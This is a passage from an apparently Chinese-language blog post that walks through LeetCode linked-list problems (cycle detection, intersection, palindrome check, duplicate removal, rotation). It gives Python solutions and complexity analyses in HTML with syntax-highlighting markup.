title="题目描述"></a>题目描述</h3><p>给定一个链表，判断链表中是否有环。</p><p>如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。</p><p>如果链表中存在环，则返回 true 。 否则，返回 false 。</p><p><strong>示例 1：</strong></p><p><img src="/2020/05/07/leetcode-list/1625651307005.png" alt="1625651307005"></p><pre><code>输入：head = [3,2,0,-4], pos = 1输出：true解释：链表中有一个环，其尾部连接到第二个节点</code></pre><h3 id="方法一：哈希表"><a href="#方法一：哈希表" class="headerlink" title="方法一：哈希表"></a>方法一：哈希表</h3><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p>最容易想到的方法是遍历所有节点，每次遍历到一个节点时，判断该节点此前是否被访问过。</p><p>具体地，我们可以使用哈希表来存储所有已经访问过的节点。每次我们到达一个节点，如果该节点已经存在于哈希表中，则说明该链表是环形链表，否则就将该节点加入哈希表中。重复这一过程，直到我们遍历完整个链表即可。</p><p>注意即使链表有重复的value值也没关系，因为哈希表中存的是地址，而不是val值。</p><h4 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">hasCycle</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head: ListNode        :rtype: bool        """</span>        <span class="token comment" spellcheck="true">######方法1  哈希表</span>        record<span class="token operator">=</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> head<span class="token punctuation">:</span>            <span class="token keyword">if</span> head <span class="token keyword">in</span> record<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#存在重复 则返回true</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>            record<span class="token punctuation">.</span>add<span class="token punctuation">(</span>head<span class="token punctuation">)</span>            head<span class="token operator">=</span>head<span class="token punctuation">.</span>next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-8"><a href="#复杂度分析-8" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><strong>时间复杂度：</strong>O(N)，其中 N 是链表中的节点数。最坏情况下我们需要遍历每个节点一次。</p><p><strong>空间复杂度：</strong>O(N)，其中 N是链表中的节点数。主要为哈希表的开销，最坏情况下我们需要将每个节点插入到哈希表中一次。</p><h3 id="方法二：快慢指针"><a href="#方法二：快慢指针" class="headerlink" title="方法二：快慢指针"></a>方法二：快慢指针</h3><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p>本方法需要读者对「Floyd 判圈算法」（又称龟兔赛跑算法）有所了解。</p><p>假想「乌龟」和「兔子」在链表上移动，「兔子」跑得快，「乌龟」跑得慢。当「乌龟」和「兔子」从链表上的同一个节点开始移动时，如果该链表中没有环，那么「兔子」将一直处于「乌龟」的前方；如果该链表中有环，那么「兔子」会先于「乌龟」进入环，并且一直在环内移动。等到「乌龟」进入环时，由于「兔子」的速度快，它一定会在某个时刻与乌龟相遇，即套了「乌龟」若干圈。</p><p>我们可以根据上述思路来解决本题。具体地，我们定义两个指针，一快一满。慢指针每次只移动一步，而快指针每次移动两步。初始时，慢指针在位置 head，而快指针在位置 head.next。这样一来，如果在移动的过程中，快指针反过来追上慢指针，就说明该链表为环形链表。否则快指针将到达链表尾部，该链表不为环形链表。</p><p>对于为什么这个快指针走两步，慢指针走一步，必会在环内相遇？并且然后慢指针从开始重新走，另一个指针从快慢指针相遇位置走，这时每次都是走一步，两指针必会在环的入口处相遇。这是<a href="https://leetcode-cn.com/problems/find-the-duplicate-number/solution/xun-zhao-zhong-fu-shu-by-leetcode-solution/">有数学公式可以证明的。</a></p><h4 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">hasCycle</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">###########方法2  快慢指针  </span>        <span class="token keyword">if</span> head <span class="token keyword">is</span> None <span class="token operator">or</span> head<span class="token punctuation">.</span>next <span class="token keyword">is</span> None<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        slow<span class="token operator">=</span>head        fast<span class="token operator">=</span>head        <span class="token keyword">while</span> fast <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> fast<span class="token punctuation">.</span>next <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>            fast<span class="token operator">=</span>fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#快指针走2步</span>            slow<span class="token operator">=</span>slow<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#慢指针走一步</span>            <span class="token keyword">if</span> slow<span class="token operator">==</span>fast<span class="token punctuation">:</span>                 <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token comment" spellcheck="true">#/先移动再判断，避免两个都在head还没移动的情况</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true">#fast == null || fast.next == null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-9"><a href="#复杂度分析-9" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><strong>时间复杂度：</strong>O(N)，其中 N是链表中的节点数。</p><p>当链表中不存在环时，快指针将先于慢指针到达链表尾部，链表中每个节点至多被访问两次。</p><p>当链表中存在环时，每一轮移动后，快慢指针的距离将减小一。而初始距离为环的长度，因此至多移动 N轮。</p><p><strong>空间复杂度：</strong>O(1)。我们只使用了两个指针的额外空间。</p><h2 id="8-leetcode142-环形链表-II"><a href="#8-leetcode142-环形链表-II" class="headerlink" title="8 leetcode142. 环形链表 II"></a>8 <a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">leetcode142. 环形链表 II</a></h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。</p><p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意，pos 仅仅是用于标识环的情况，并不会作为参数传递到函数中。</p><p>说明：不允许修改给定的链表。</p><p>进阶：你是否可以使用 O(1) 空间解决此题？</p><p><strong>示例 1：</strong></p><p><img src="/2020/05/07/leetcode-list/1625654026232.png" alt="1625654026232"></p><pre><code>输入：head = [3,2,0,-4], pos = 1输出：返回索引为 1 的链表节点解释：链表中有一个环，其尾部连接到第二个节点。</code></pre><h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>我们使用两个指针，fast 与slow。它们起始都位于链表的头部。随后，slow 指针每次向后移动一个位置，而 fast 指针向后移动两个位置。如果链表中存在环，则fast 指针最终将再次与 slow 指针在环中相遇。</p><p><strong>再理清步骤前，我们应该知道如下知识：</strong>如下图所示，设链表中环外部分的长度为 x。slow 指针进入环后，又走了y 的距离与 fast 相遇。此时，fast 指针已经走完了环的 n 圈(这里为了方便理解假设n=1，一般情况的推荐见<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/solution/huan-xing-lian-biao-iikuai-man-zhi-zhen-eaqzh/">详细原理</a>)，因此慢指针slow走过的距离为x+y，快指针fast走过的距离为x+y+z。因为快指针走过的距离是慢指针的2倍，则2(x+y)=x+y+z,从而x=z。</p><p><img src="/2020/05/07/leetcode-list/1625714884747.png" alt="1625714884747"></p><p><strong>解题步骤：</strong></p><p>（1）设置快慢指针都从head出发，快指针fast每次走2步，慢指针slow每次走1步，如果链表有环，则必然相遇在p点。</p><p>（2）第一次相遇后，将慢指针slow重新从链表的head出发，每次走一步；快指针保持在相遇点p处，继续前行但是每次都一步。（注意此时快慢指针同步前行）。由于前面推导出的x=z，则快慢指针一定会在环的入口处再次相遇。即得到了入环节点。<strong>（这里需要注意，当slow从head出发，fast从相遇点p出发，应该先判断fast是否等于head后，再同步向前走；因为如果先同步走再判断，会错过入环为head的情况）</strong></p><h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">detectCycle</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head: ListNode        :rtype: ListNode        """</span>        fast<span class="token operator">=</span>head        slow<span class="token operator">=</span>head        <span class="token keyword">while</span> fast <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> fast<span class="token punctuation">.</span>next <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>            fast<span class="token operator">=</span>fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#快指针走两步</span>            slow<span class="token operator">=</span>slow<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#慢指针走1步</span>            <span class="token keyword">if</span> fast<span class="token operator">==</span>slow<span class="token punctuation">:</span>                <span class="token keyword">break</span>        slow<span class="token operator">=</span>head<span class="token comment" spellcheck="true">#慢指针重新从head走</span>        <span class="token keyword">while</span> fast <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> fast<span class="token punctuation">.</span>next <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>            <span class="token keyword">if</span> fast<span class="token operator">==</span>slow<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#注意这个要放Fast和slow同步移动的前面，因为环有可能在head上</span>                <span class="token keyword">return</span> slow            <span class="token comment" spellcheck="true">#快慢指针同步走一步</span>            fast<span class="token operator">=</span>fast<span class="token punctuation">.</span>next            slow<span class="token operator">=</span>slow<span class="token punctuation">.</span>next        <span class="token keyword">return</span> None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-10"><a href="#复杂度分析-10" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度：O(N)，其中 NN 为链表中节点的数目。在最初判断快慢指针是否相遇时，slow 指针走过的距离不会超过链表的总长度；随后寻找入环点时，走过的距离也不会超过链表的总长度。因此，总的执行时间为 O(N)+O(N)=O(N)。</p><p>空间复杂度：O(1)。我们只使用了slow,fast三个指针。</p><h2 id="9-leetcode160-相交链表"><a href="#9-leetcode160-相交链表" class="headerlink" title="9 leetcode160. 相交链表"></a>9 <a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/">leetcode160. 相交链表</a></h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你两个单链表的头节点 headA 和 headB ，请你找出并返回两个单链表相交的起始节点。如果两个链表没有交点，返回 null 。</p><p><img src="/2020/05/07/leetcode-list/1625726455816.png" alt="1625726455816"></p><p>输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3<br>输出：Intersected at ‘8’<br>解释：相交节点的值为 8 （注意，如果两个链表相交则不能为 0）。<br>从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。<br>在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。</p><h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>本题目很容易想到使用哈希表，遍历A链表，存入哈希表中，再遍历B链表，发现重复值，即相交的点，时间复杂度为o(n)，但是空间复杂度也为o(n)。</p><p>为了降低空间复杂度，可以使用双指针，我们需要做的事情是，让两个链表从同距离末尾同等距离的位置开始遍历。这个位置只能是较短链表的头结点位置。<br>为此，我们必须消除两个链表的长度差。</p><ol><li>指针 pA 指向 A 链表，指针 pB 指向 B 链表，依次往后遍历</li><li>如果 pA 到了末尾，则 pA = headB 继续遍历</li><li>如果 pB 到了末尾，则 pB = headA 继续遍历</li><li>比较长的链表指针指向较短链表head时，长度差就消除了<br>如此，只需要将最短链表遍历两次即可找到位置，如下图所示。</li></ol><p><img src="/2020/05/07/leetcode-list/1625726469622.png" alt="1625726469622"></p><h3 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">getIntersectionNode</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> headA<span class="token punctuation">,</span> headB<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head1, head1: ListNode        :rtype: ListNode        """</span>        a<span class="token operator">=</span>headA        b<span class="token operator">=</span>headB        <span class="token keyword">while</span> a<span class="token operator">!=</span>b<span class="token punctuation">:</span>            <span class="token keyword">if</span> a <span class="token keyword">is</span> None<span class="token punctuation">:</span>                a<span class="token operator">=</span>headB<span class="token comment" spellcheck="true">#a走完A链表，然后从headB再走</span>            <span class="token keyword">elif</span> b <span class="token keyword">is</span> None<span class="token punctuation">:</span>                b<span class="token operator">=</span>headA<span class="token comment" spellcheck="true">#b走完B链表，然后从headA再走</span>            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#a,b同步往下走</span>                a<span class="token operator">=</span>a<span class="token punctuation">.</span>next                b<span class="token operator">=</span>b<span class="token punctuation">.</span>next        <span class="token keyword">return</span> a<span class="token comment" spellcheck="true">#如果无交点，则a，b会同时指向None   </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-11"><a href="#复杂度分析-11" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><strong>时间复杂度：</strong>O(m+n)，其中 m 和 n 是分别是链表 headA 和headB 的长度。两个指针同时遍历两个链表，每个指针遍历两个链表各一次。</p><p><strong>空间复杂度：</strong>O(1)。</p><h2 id="10-leetcode-234-回文链表"><a href="#10-leetcode-234-回文链表" class="headerlink" title="10 leetcode 234 回文链表"></a>10 leetcode 234 回文链表</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>请判断一个链表是否为回文链表。</p><p>示例 1:</p><p>输入: 1-&gt;2<br>输出: false<br>示例 2:</p><p>输入: 1-&gt;2-&gt;2-&gt;1<br>输出: true</p><h3 id="解题思路-快慢指针法"><a href="#解题思路-快慢指针法" class="headerlink" title="解题思路-快慢指针法"></a>解题思路-快慢指针法</h3><p>本题较简单的方法是借助数组，将链表的值复制到一个数组中，在进行两段比较；但是这样因为使用了一个数组，空间复杂度为o(n)，为了降低空间复杂度到o(1),我们使用快慢指针，起初都指向表头，快指针一次走两步，慢指针一次走一步，遍历结束时：</p><p>要么，slow 正好指向中间两个结点的后一个。<br>要么，slow 正好指向中间结点。<br>用 prev 保存 slow 的前一个结点，通过prev.next = null断成两个链表。</p><p><strong>步骤如下：</strong></p><p>1） 利用快慢指针，找到中间结点，即切割结点。并利用pre记录切割点的前一结点</p><p>2）将链表切割成两段，令pre.next=None</p><ol start="3"><li>反转第二部分的链表  leetcode206题</li></ol><p>4）开始比较两部分链表的val值，<strong>注意这里不能直接比较节点，应该比较节点的val值</strong></p><p><img src="/2020/05/07/leetcode-list/1626061772788.png" alt="1626061772788"></p><h3 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Definition for singly-linked list.</span><span class="token comment" spellcheck="true"># class ListNode(object):</span><span class="token comment" spellcheck="true">#     def __init__(self, val=0, next=None):</span><span class="token comment" spellcheck="true">#         self.val = val</span><span class="token comment" spellcheck="true">#         self.next = next</span><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">isPalindrome</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head: ListNode        :rtype: bool        """</span>        <span class="token comment" spellcheck="true">###反转链表</span>        <span class="token keyword">def</span> <span class="token function">reverseList</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">:</span>            pre<span class="token operator">=</span>ListNode<span class="token punctuation">(</span><span class="token punctuation">)</span>            curr<span class="token operator">=</span>head            <span class="token keyword">while</span> curr <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>                next<span class="token operator">=</span>curr<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#保存当前节点的下一个值</span>                curr<span class="token punctuation">.</span>next<span class="token operator">=</span>pre<span class="token comment" spellcheck="true"># 反转  当前节点curr反向指前一个元素pre</span>                <span class="token comment" spellcheck="true">##curr和pre后移</span>                pre<span class="token operator">=</span>curr                curr<span class="token operator">=</span>next            <span class="token keyword">return</span> pre        <span class="token comment" spellcheck="true">###第一步找到 切割点</span>        fast<span class="token operator">=</span>head        slow<span class="token operator">=</span>head<span class="token comment" spellcheck="true">#慢指针，找到链表中间分位置，作为分割</span>        pre<span class="token operator">=</span>head <span class="token comment" spellcheck="true"># 记录慢指针的前一个节点，用来分割链表</span>        <span class="token keyword">while</span> fast <span class="token keyword">is</span> <span class="token operator">not</span> None  <span class="token operator">and</span> fast<span class="token punctuation">.</span>next <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>            pre<span class="token operator">=</span>slow            fast<span class="token operator">=</span>fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next            slow<span class="token operator">=</span>slow<span class="token punctuation">.</span>next        <span class="token comment" spellcheck="true">###第二步  进行切割</span>        pre<span class="token punctuation">.</span>next<span class="token operator">=</span>None<span class="token comment" spellcheck="true">#分割链表</span>        <span class="token comment" spellcheck="true">##第三步  反转第二部分</span>        cur1<span class="token operator">=</span>head        cur2<span class="token operator">=</span>reverseList<span class="token punctuation">(</span>slow<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#反转后半部分 总链表长度如果是奇数，cur2比cur1多一个节点</span>        <span class="token comment" spellcheck="true">##第四步  开始两个链表的val的比较</span>        <span class="token keyword">while</span> cur1<span class="token punctuation">:</span>            <span class="token keyword">if</span> cur1<span class="token punctuation">.</span>val<span class="token operator">!=</span>cur2<span class="token punctuation">.</span>val<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>            cur1<span class="token operator">=</span>cur1<span class="token punctuation">.</span>next            cur2<span class="token operator">=</span>cur2<span class="token punctuation">.</span>next        <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-12"><a href="#复杂度分析-12" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度：O(n)，其中 n指的是链表的大小。</p><p>空间复杂度：O(1)。我们只会修改原本链表中节点的指向，而在堆栈上的堆栈帧不超过 O(1)。</p><h2 id="11-leetcode-83-删除排序链表中的重复元素"><a href="#11-leetcode-83-删除排序链表中的重复元素" class="headerlink" title="11 leetcode 83 删除排序链表中的重复元素"></a>11 <a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/">leetcode 83 删除排序链表中的重复元素</a></h2><h3 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h3><p>存在一个按升序排列的链表，给你这个链表的头节点 head ，请你删除所有重复的元素，使每个元素 只出现一次 。</p><p>返回同样按升序排列的结果链表。</p><p> <strong>示例 1：</strong></p><p><img src="/2020/05/07/leetcode-list/1626071855567.png" alt="1626071855567"></p><pre><code>输入：head = [1,1,2,3,3]输出：[1,2,3]</code></pre><h3 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h3><p>由于给定的链表是排好序的，因此重复的元素在链表中出现的位置是连续的，因此我们只需要对链表进行一次遍历，就可以删除重复的元素。</p><p>具体地，我们从指针cur 指向链表的头节点，随后开始对链表进行遍历。如果当前cur 与cur.next 对应的元素相同，那么我们就将cur.next 从链表中移除；否则说明链表中已经不存在其它与cur 对应的元素相同的节点，因此可以将cur 指向cur.next。</p><p>当遍历完整个链表之后，我们返回链表的头节点即可。</p><h3 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">deleteDuplicates</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">)</span><span class="token punctuation">:</span>        cur<span class="token operator">=</span>head        <span class="token keyword">while</span> cur <span class="token operator">and</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">:</span>            <span class="token keyword">if</span>  cur<span class="token punctuation">.</span>val<span class="token operator">==</span>cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>val<span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">#删除重复的next节点</span>                cur<span class="token punctuation">.</span>next<span class="token operator">=</span>cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next                <span class="token comment" spellcheck="true">#为什么跳过重复指针的时候，后边不再更新一下cur位置？即cur=cur.next</span>                <span class="token comment" spellcheck="true"># 因为可能跳过重复位置后，cur和当前新的cur.next的值可能是相等的，所以还要再比较一次。</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                cur<span class="token operator">=</span>cur<span class="token punctuation">.</span>next        <span class="token keyword">return</span> head<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-13"><a href="#复杂度分析-13" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul><li>时间复杂度：O(n)，其中 n是链表的长度。</li><li>空间复杂度：O(1)。</li></ul><h2 id="12-leetcode82删除排序链表中的重复元素-II"><a href="#12-leetcode82删除排序链表中的重复元素-II" class="headerlink" title="12 leetcode82删除排序链表中的重复元素 II"></a>12 <a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/">leetcode82删除排序链表中的重复元素 II</a></h2><h3 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h3><p>存在一个按升序排列的链表，给你这个链表的头节点 head ，请你删除链表中所有存在数字重复情况的节点，只保留原始链表中 没有重复出现 的数字。</p><p>返回同样按升序排列的结果链表。</p><p><strong>示例 1：</strong></p><p><img src="/2020/05/07/leetcode-list/1626077753118.png" alt="1626077753118"></p><p>输入：head = [1,2,3,3,4,4,5]<br>输出：[1,2,5]</p><h3 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h3><p>由于给定的链表是排好序的，因此重复的元素在链表中出现的位置是连续的，因此我们只需要对链表进行一次遍历，就可以删除重复的元素。由于链表的头节点可能会被删除，因此我们需要额外使用一个哑节点（dummy node）指向链表的头节点。具体步骤如下：</p><p>（1）我们从指针 pre指向链表的哑节点，cur指向head节点，随后开始对链表进行遍历。</p><p>（2）如果当前 cur与 cur.next对应的元素相同，那么我们就需要将 cur以及所有后面拥有相同元素值的链表节点全部删除。我们记下这个元素值val，随后不断将cur右移，直到其元素值不等于 xx 或者为空为止。此时，我们将链表中所有元素值为 xx 的节点全部删除:pre=cur。</p><p>如果当前 cur与 cur.next对应的元素不相同，只需要同步移动pre和cur即可。</p><p><img src="/2020/05/07/leetcode-list/1626079023414.png" alt="1626079023414"></p><h3 id="代码-13"><a href="#代码-13" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">deleteDuplicates</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type head: ListNode        :rtype: ListNode        """</span>        dummy<span class="token operator">=</span>ListNode<span class="token punctuation">(</span><span class="token punctuation">)</span>        dummy<span class="token punctuation">.</span>next<span class="token operator">=</span>head        pre<span class="token operator">=</span>dummy<span class="token comment" spellcheck="true">#保存游标前一个节点</span>        cur<span class="token operator">=</span>head        <span class="token keyword">while</span> cur <span class="token operator">and</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">:</span>            <span class="token keyword">if</span> cur<span class="token punctuation">.</span>val<span class="token operator">==</span>cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>val<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#当前值与next值相等</span>                val<span class="token operator">=</span>cur<span class="token punctuation">.</span>val<span class="token comment" spellcheck="true">#记录下重复值</span>                <span class="token comment" spellcheck="true">###当前cur与cur.next重复，则pre和cur一直向右走，直到cur.next不重复</span>                <span class="token keyword">while</span> cur<span class="token punctuation">.</span>next <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>val<span class="token operator">==</span>val<span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true">#删除重复的cur与cur.next节点 包括当前节点</span>                    cur<span class="token operator">=</span>cur<span class="token punctuation">.</span>next                pre<span class="token punctuation">.</span>next<span class="token operator">=</span>cur<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#将pre的next指向cur的next，删除中间的重复值</span>                cur<span class="token operator">=</span>pre<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#cur删除了 #当前节点不是重复节点，pre来到cur的next位置 重新从pre.next走</span>            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#当前值与next值不相等</span>                pre<span class="token operator">=</span>cur                cur<span class="token operator">=</span>cur<span class="token punctuation">.</span>next<span class="token comment" spellcheck="true">#cur继续往下走</span>        <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-14"><a href="#复杂度分析-14" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><ul><li>时间复杂度：O(n)，其中 n是链表的长度。</li><li>空间复杂度：O(1)。</li></ul><h2 id="13-leetcode61-旋转链表"><a href="#13-leetcode61-旋转链表" class="headerlink" title="13 leetcode61  旋转链表"></a>13 <a href="https://leetcode-cn.com/problems/rotate-list/">leetcode61  旋转链表</a></h2><h3 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你一个链表的头节点 <code>head</code> ，旋转链表，将链表每个节点向右移动 <code>k</code> 个位置。</p><p>  <strong>示例 1：</strong></p><p> <img src="/2020/05/07/leetcode-list/1626081701946.png" alt="1626081701946"></p><pre><code>输入：head = [1,2,3,4,5], k = 2输出：[4,5,1,2,3]</code></pre><h3 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h3><p><strong>首位相接，再砍一刀：</strong></p><p>这道题目简单可以将链表每个节点向右移动 <code>k</code> 个位置转化为从倒数第k-1个元素处断开，将断开后的接到head前即可。更简单点就是 先将尾巴接到head上，再一刀从倒数第k+1个元素切开即可。具体步骤如下：</p><p>（1）计算链表长度n,并简化k:k=k%n</p><p>（2）将链表尾巴接到head上</p><p>（3）找到倒数第k+1个节点，切断：k+1.next=None(这里使用快慢指针也可以)</p><p>（4）返回新的头节点</p><p><img src="/2020/05/07/leetcode-list/1626145213645.png" alt="1626145213645"></p><h3 id="代码-14"><a href="#代码-14" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Definition for singly-linked list.</span><span class="token comment" spellcheck="true"># class ListNode(object):</span><span class="token comment" spellcheck="true">#     def __init__(self, val=0, next=None):</span><span class="token 